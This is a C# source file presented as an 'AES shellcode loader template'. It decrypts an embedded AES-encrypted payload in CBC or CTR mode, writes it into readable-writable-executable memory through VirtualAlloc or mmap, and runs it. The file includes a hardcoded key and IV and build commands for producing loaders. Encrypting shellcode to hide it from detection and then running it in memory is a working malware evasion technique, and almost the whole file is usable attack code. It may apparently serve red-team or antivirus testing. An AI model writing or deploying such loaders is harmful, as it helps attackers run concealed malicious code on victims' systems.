/*
 * aes_loader.cs - AES shellcode loader template (C#)
 * ==================================================
 * Decrypts an embedded AES blob and executes it as a function.
 * Two modes, selected at compile time:
 *   default : CBC with PKCS#7 padding (payload_len > original_len)
 *   -define:AES_CTR : CTR mode, full 128-bit big-endian counter that
 *                     starts at kIv; BCL AES-ECB encrypts each counter
 *                     block to form the keystream (length-preserving).
 *
 * Uses the .NET/mono BCL (System.Security.Cryptography.Aes); key size
 * follows the embedded key length (32 B -> AES-256).
 *
 * Build-time parameters (see payloads/aes_cbc_300b.meta.json):
 *   key : 3031323334353637383961626364656630313233343536373839616263646566 (32 B)
 *   iv  : 00112233445566778899aabbccddeeff
 *
 * Regenerate the payload include with the builder:
 *   python3 tools/gen_inc.py aes_cbc 300 --lang cs --out loaders/csharp/aes/payload_inc.cs
 *   python3 tools/gen_inc.py aes_ctr 300 --lang cs --out loaders/csharp/aes/payload_inc.cs
 *
 * Compile (mono):
 *   mcs -r:System.Core.dll -out:aes_loader.exe aes_loader.cs payload_inc.cs        # CBC
 *   mcs -r:System.Core.dll -define:AES_CTR -out:aes_loader.exe aes_loader.cs payload_inc.cs
 *   mono aes_loader.exe
 */
using System;
using System.Security.Cryptography;
using System.Runtime.InteropServices;

static class AesLoader
{
    static readonly byte[] Key = {
        0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x61, 0x62,
        0x63, 0x64, 0x65, 0x66, 0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37,
        0x38, 0x39, 0x61, 0x62, 0x63, 0x64, 0x65, 0x66
    };
    static readonly byte[] Iv = {
        0x00, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77,
        0x88, 0x99, 0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff
    };

#if AES_CTR
    /* Full 128-bit big-endian counter increment. */
    static void Incr128Be(byte[] ctr)
    {
        for (int i = 15; i >= 0; i--)
        {
            ctr[i]++;
            if (ctr[i] != 0) break;
        }
    }

    /* keystream = AES_ECB_encrypt(counter) for counter = kIv, kIv+1, ... */
    static byte[] Decrypt(byte[] ct)
    {
        byte[] pt = new byte[ct.Length];
        byte[] ks = new byte[16];
        byte[] ctr = (byte[])Iv.Clone();
        using (Aes aes = Aes.Create())
        {
            aes.Mode = CipherMode.ECB;
            aes.Padding = PaddingMode.None;
            aes.Key = Key;
            using (ICryptoTransform enc = aes.CreateEncryptor())
            {
                for (int off = 0; off < ct.Length; off += 16)
                {
                    enc.TransformBlock(ctr, 0, 16, ks, 0);
                    Incr128Be(ctr);
                    int n = Math.Min(16, ct.Length - off);
                    for (int i = 0; i < n; i++)
                        pt[off + i] = (byte)(ct[off + i] ^ ks[i]);
                }
            }
        }
        return pt;
    }
#else
    /* CBC with PKCS#7 padding: TransformFinalBlock strips the padding. */
    static byte[] Decrypt(byte[] ct)
    {
        using (Aes aes = Aes.Create())
        {
            aes.Mode = CipherMode.CBC;
            aes.Padding = PaddingMode.PKCS7;
            aes.Key = Key;
            aes.IV = Iv;
            using (ICryptoTransform dec = aes.CreateDecryptor())
                return dec.TransformFinalBlock(ct, 0, ct.Length);
        }
    }
#endif

    /* ---------------- execution method (shared by all templates) ------- */

    delegate int PayloadFn();

    static bool IsWindows
    {
        get
        {
            PlatformID p = Environment.OSVersion.Platform;
            return p == PlatformID.Win32NT || p == PlatformID.Win32Windows || p == PlatformID.WinCE;
        }
    }

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr VirtualAlloc(IntPtr addr, UIntPtr size, uint type, uint protect);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool VirtualFree(IntPtr addr, UIntPtr size, uint freeType);

    [DllImport("libc", SetLastError = true)]
    static extern IntPtr mmap(IntPtr addr, UIntPtr length, int prot, int flags, int fd, IntPtr offset);

    [DllImport("libc", SetLastError = true)]
    static extern int munmap(IntPtr addr, UIntPtr length);

    static int Run(byte[] shellcode)
    {
        IntPtr mem;
        if (IsWindows)
        {
            mem = VirtualAlloc(IntPtr.Zero, (UIntPtr)shellcode.Length, 0x3000 /*MEM_COMMIT|MEM_RESERVE*/,
                               0x40 /*PAGE_EXECUTE_READWRITE*/);
            if (mem == IntPtr.Zero) { Console.WriteLine("[-] VirtualAlloc failed"); return -1; }
        }
        else
        {
            mem = mmap(IntPtr.Zero, (UIntPtr)shellcode.Length,
                       0x7 /*PROT_READ|PROT_WRITE|PROT_EXEC*/,
                       0x22 /*MAP_PRIVATE|MAP_ANONYMOUS*/, -1, IntPtr.Zero);
            if (mem == new IntPtr(-1)) { Console.WriteLine("[-] mmap failed"); return -1; }
        }
        Marshal.Copy(shellcode, 0, mem, shellcode.Length);
        int r = ((PayloadFn)Marshal.GetDelegateForFunctionPointer(mem, typeof(PayloadFn)))();
        if (IsWindows)
            VirtualFree(mem, UIntPtr.Zero, 0x8000 /*MEM_RELEASE*/);
        else
            munmap(mem, (UIntPtr)shellcode.Length);
        return r;
    }

    public static void Main()
    {
        byte[] plain = Decrypt(Payload.Data);
#if AES_CTR
        Console.WriteLine("[+] AES-256-CTR decrypted " + plain.Length + " bytes");
#else
        Console.WriteLine("[+] AES-256-CBC decrypted " + plain.Length + " bytes");
#endif
        int r = Run(plain);
        Console.WriteLine("[+] payload returned " + r);
    }
}
